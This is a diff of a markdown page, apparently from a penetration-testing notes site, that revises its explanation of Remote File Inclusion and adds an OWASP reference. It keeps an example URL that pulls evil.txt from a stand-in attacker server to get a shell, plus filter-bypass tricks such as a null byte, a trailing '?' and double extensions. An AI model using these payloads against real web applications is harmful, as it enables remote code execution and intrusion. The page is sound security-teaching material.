@@ -1,10 +1,8 @@
----
-description: >-
-  A remote file inclusion vulnerability allows an attacker to remotely execute a
-  script on the victim even if it is not available locally.
----
-
 # Remote File Inclusion (RFI)
+
+### Description
+
+Remote file inclusion (RFI) is the process of including remote files through the exploiting of vulnerable inclusion procedures implemented in the application. The main difference when compared to LFI, is that RFI allows for an external URL to be injected, meaning that an attacker can include a malicious file, such as a PHP shell on their attack host.&#x20;
 
 ### Examples
 
@@ -39,7 +37,6 @@ The simplest way to obtain a shell is to make a callback to the attacker server:
 
 ```bash
 http://acme.com/index.php?page=http://attackerserver.com/evil.txt
-
 ```
 
 Alternatively, the following commands can be input to a .txt file to obtain code execution:
@@ -54,10 +51,9 @@ Alternatively, the following commands can be input to a .txt file to obtain code
 
 ### Notes
 
-As stated briefly in the [LFI section](local-file-inclusion-lfi.md#additional-notes)
+* As stated briefly in the [LFI section](local-file-inclusion-lfi.md#additional-notes), it is important in some situations to add a nullbyte `%00` to avoid appending `.php` or another extension like `.config`. If this does not work you can also add a `?`, to ensure that the rest will be interpreted as URL parameters.&#x20;
+  * A pretty dirty way of bypassing this is also to name your file with the extension, e.g., `evil.txt.php`
 
-It is important in some situations to add a nullbyte `%00` to avoid appending `.php` or another extension like `.config`
+### References <a href="#avoid-extentions" id="avoid-extentions"></a>
 
-If this does not work you can also add a `?`, to ensure that the rest will be interpreted as URL parameters.
-
-A dirty way of bypassing this is also to name your file with the extension, e.g., `evil.txt.php`
+{% embed url="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion" %}
